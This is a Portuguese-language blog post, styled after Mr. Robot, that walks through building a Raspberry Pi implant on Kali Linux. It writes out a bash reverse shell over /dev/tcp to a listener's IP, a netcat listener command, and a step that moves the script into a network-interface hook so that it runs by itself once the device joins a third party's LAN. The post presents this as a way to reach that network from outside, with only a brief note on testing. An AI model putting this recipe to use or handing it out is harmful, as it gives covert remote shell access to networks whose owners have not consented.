---
layout: post
title: Mr. robot's raspberry Pi
description: "Como criar um raspberry Pi semelhante ao utilizado por Elliot na primeira temporada de Mr Robot"
tags:
  - "Raspberry"
author: lgribeiro
date: 2016-11-07
published: 2016-11-07
---

Algum tempo atrás estava dando uma olhada nos posts da série Mr Robot do [null-byte](http://null-byte.wonderhowto.com/how-to/mr-robot-hacks/) e um artigo em especial me chamou a atenção.

A publicação sobre como criar um raspberry para hacking não retrata fielmente as condições encontradas por Elliot no episódio eps1.3\_\_da3m0ns.mp4. Então, optei por adaptar um pouco o tutorial para ele se tornar mais parecido com o conteúdo apresentado na televisão. De início, os passos serão bem semelhantes aos apresentados pelo null-byte mas no final, teremos um algo a mais.

1.Baixar o [Kali linux para ARM](https://www.offensive-security.com/kali-linux-arm-images/). Escolha aquela que se adequa ao hardware que estiver utilizando. Iremos utilizar o Kali pois é uma distribuição linux focada em segurança, e por conta disso, fornecerá diversas ferramentas que poderão ser utilizadas em missões futuras.

![Bruh](/images/offensive-sec.png)


2.Feito isso, precisamos criar um script que funcionará como nosso nosso shell reverso no raspberry. Para tal, é recomendável utilizar o [reverse shell cheat sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) da pentest Monkey. Utilizaremos o shell reverso abaixo.

```bash
bash -i >& /dev/tcp/<ip da maquina que está escutando>/8080 0>&1
```

Colocamos então o código acima em um arquivo (chamaremos ele de reverse) e concedemos a ele permissão de execução da seguinte maneira:

```bash
chmod +x reverse
```

Obs: Vale ressaltar que não devemos colocar o script com extensão .sh pois o diretório em que ele será armazenado não executa arquivos com essa extensão.

3.Agora, é necessário preparar uma máquina capaz de receber essa shell fornecida pelo raspberry. Para isso, podemos utilizar o canivete suiço de conexões TCP, o netcat. Basta colocar o netcat para escutar na porta em que a shell será fornecida da seguinte forma:

```bash
 nc -lvp 8080
```

4.Com a estrutura pronta, precisamos organizar tudo o que temos para que seja possível acessar o raspberry dentro de uma LAN de terceiros. A partir desse ponto nos desviamos um pouco do artigo que utilizamos como base.
No lugar de teclado, tela e demais periféricos, colocaremos nosso script no diretório /etc/network/interfaces/ifup. 

```bash
mv reverse /etc/network/interfaces/ifup
```

Dessa forma, assim que a interface de rede do nosso dispositivo começar a funcionar ele executará o script, que fornecerá a shell para a máquina de fora da LAN.

![elliot wins](/images/mr-robot-success.1280x600.jpg)

Ressalvas:

* Para testar, utilize duas máquinas na mesma LAN, ou a máquina que escuta deverá ter um IP real ou ter um portfoward settado no roteador para que as conexões recebidas em detarmidana porta sejam redirecionadas para a máquina que está escutando.

Quaisquer dúvidas, entre em contato via email: lgribeiro at gris.dcc.ufrj.br


